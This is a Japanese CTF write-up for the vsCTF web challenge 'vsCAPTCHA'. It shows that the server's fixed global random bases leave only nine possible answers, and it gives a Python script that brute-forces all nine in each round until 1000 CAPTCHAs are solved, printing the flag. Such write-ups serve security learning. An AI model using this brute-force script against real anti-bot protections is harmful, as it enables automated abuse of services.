# vsCAPTCHA:Web:487pts
vsCAPTCHA: the ultimate solution to protect your site from 100% of bots, guaranteed!  
[https://vscaptcha-twekqonvua-uc.a.run.app](https://vscaptcha-twekqonvua-uc.a.run.app/)  
Downloads  
[vsCAPTCHA.zip](vsCAPTCHA.zip)  

# Solution
URLとソースが渡される。  
アクセスするとオレオレCAPTCHAが動いており、表示されている数字の足し算を1000回正解するとクリアのようだ。  
vsCaptcha  
[site.png](site/site.png)  
光学文字認識も不可能で一見すると安全だが、眺めていると不審な点に気づく。  
計算のもととなる二つの数字が`154~160`、`425~427`の間のみで動いている。  
乱数の生成部分がおかしいと予想し、配布されたソースを見ると以下のようであった。  
```ts
~~~
const FLAG = Deno.env.get("FLAG") ?? "vsctf{REDACTED}";
const captchaSolutions = new Map();

interface CaptchaJWT {
  exp: number;
  jti: string;
  flag?: string;
  failed: boolean;
  numCaptchasSolved: number;
}

const jwtKey = await jose.importPKCS8(
  new TextDecoder().decode(await Deno.readFile("./jwtRS256.key")),
  "RS256"
);
const jwtPubKey = await jose.importSPKI(
  new TextDecoder().decode(await Deno.readFile("./jwtRS256.key.pub")),
  "RS256"
);

const app = new Application();
const router = new Router();

const b1 = Math.floor(Math.random() * 500);
const b2 = Math.floor(Math.random() * 500);

~~~

router.post("/captcha", async (ctx) => {
  const stateJWT = ctx.request.headers.get("x-captcha-state");
  const body = await ctx.request.body({
    type: "json",
  }).value;
  const solution = body.solution;

  let jwtPayload: CaptchaJWT = {
    // 10 seconds to solve
    exp: Math.round(Date.now() / 1000) + 10,
    jti: crypto.randomUUID(),
    failed: false,
    numCaptchasSolved: 0,
  };

  if (stateJWT) {
    try {
      const { payload } = await jose.jwtVerify(stateJWT, jwtPubKey);
      jwtPayload.numCaptchasSolved = payload.numCaptchasSolved;

      if (
        !captchaSolutions.get(payload.jti) ||
        captchaSolutions.get(payload.jti) !== solution
      ) {
        const jwt = await new jose.SignJWT({
          failed: true,
          numCaptchasSolved: payload.numCaptchasSolved,
          exp: payload.exp,
        })
          .setProtectedHeader({ alg: "RS256" })
          .sign(jwtKey);

        ctx.response.headers.set("x-captcha-state", jwt);
        ctx.response.status = 401;
        return;
      }
    } catch {
      ctx.response.status = 400;
      return;
    }

    jwtPayload.numCaptchasSolved += 1;
  }

  const num1 = Math.floor(Math.random() * 7) + b1;
  const num2 = Math.floor(Math.random() * 3) + b2;

  const captcha = createCaptcha({
    width: 250,
    height: 150,
    // @ts-ignore provided options are merged with default options
    captcha: {
      text: `${num1} + ${num2}`,
    },
  });
~~~
});
~~~
```
jtiをキーとしたMapで数値の正誤判定が実装されているようだ。  
一度目の乱数生成がグローバルで宣言されており固定されている。  
二度目の乱数生成では一度目の乱数から`+7`、`+3`の範囲の整数でのみ変動するため、計算の答えは高々9通りの`579~587`である。  
jwtによるキーの受け渡しは10秒間の猶予があり、不正解である場合のリセットなどはないようなので、すべてのパターンをPOSTすれば正解を引き当てることができる。  
以下のimarobot.pyで行う(運営のサーバが貧弱でたびたび落ちたため、Speed up機構を導入している泣)。  
```python
import sys
import json
import base64
import requests

url = "https://vscaptcha-twekqonvua-uc.a.run.app"
#url = "http://localhost:8080" # Debug

res = requests.post(f"{url}/captcha", data="{}")
x_captcha_state = res.headers["x-captcha-state"]
print(base64.b64decode(x_captcha_state.split(".")[1] + "==").decode())

while True:
    for ans in [579, 580, 581, 582, 583, 584, 585, 586, 587]: # [154, 155, 156, 157, 158, 159, 160] + [425, 426, 427]
        res = requests.post(f"{url}/captcha", data=f"{{\"solution\": {ans}}}", headers={"x-captcha-state": x_captcha_state})
        if len(res.content) == 0: # Speed up!!
            continue
        try:
            state = base64.b64decode(res.headers["x-captcha-state"].split(".")[1] + "==").decode()
        except:
            print(res.headers["x-captcha-state"]) # Padding error?
        json_state = json.loads(state)
        print(state)
        if json_state["failed"] == False:
            if json_state["numCaptchasSolved"] >= 1000:
                print(f"Flag: {json_state['flag']}")
                sys.exit()
            x_captcha_state = res.headers["x-captcha-state"]
            break
```
実行する。  
```bash
$ python imarobot.py
{"exp":1657416673,"jti":"e43e4e71-afbe-4506-b0f7-a836448c3fab","failed":false,"numCaptchasSolved":0}
{"exp":1657416674,"jti":"72e4b5e7-3853-4a5f-8547-9bdc4e7ceed2","failed":false,"numCaptchasSolved":1}
{"exp":1657416677,"jti":"d39acf8e-4d55-4d91-a6f8-324fe1fea197","failed":false,"numCaptchasSolved":2}
~~~
{"exp":1657418403,"jti":"bf53eaf3-e73d-4f88-8db8-561a7cc5c1ac","failed":false,"numCaptchasSolved":998}
{"exp":1657418406,"jti":"27760cf6-5a2e-42d1-9408-bf5a09ac837c","failed":false,"numCaptchasSolved":999}
{"exp":1657418407,"jti":"7984a1c9-2345-49fd-89e2-1604de1ede16","failed":false,"numCaptchasSolved":1000,"flag":"vsctf{aut0m4t3d_act1vity_d3tected_s0lv3_1000_m0r3_c4ptcha5_t0_c0ntinu3}"}
Flag: vsctf{aut0m4t3d_act1vity_d3tected_s0lv3_1000_m0r3_c4ptcha5_t0_c0ntinu3}
```
flagが得られた。  

## vsctf{aut0m4t3d_act1vity_d3tected_s0lv3_1000_m0r3_c4ptcha5_t0_c0ntinu3}